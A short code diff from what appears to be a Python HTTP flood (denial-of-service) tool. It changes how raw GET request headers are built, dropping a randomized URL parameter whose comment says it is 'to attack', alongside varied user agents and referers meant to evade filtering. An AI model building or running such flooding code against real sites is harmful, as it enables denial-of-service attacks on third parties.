@@ -71,8 +71,8 @@ ref = ['https://www.google.com',
 
 def create_header(useragent, urlparameter, site_ref):    # create header with different user agent
     global content_length
-    header = 'GET {}?={} HTTP/1.1\r\n'.format(path, urlparameter)    # make difference
-    #header = 'GET / HTTP/1.1\r\n'
+    #header = 'GET {}?={} HTTP/1.1\r\n'.format(path, urlparameter)    # to attack with random url parameter
+    header = 'GET {} HTTP/1.1\r\n'.format(path)
     header += 'Host: {}\r\n'.format(domain)
     header += 'User-Agent: {}\r\n'.format(useragent) # make difference
     header += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
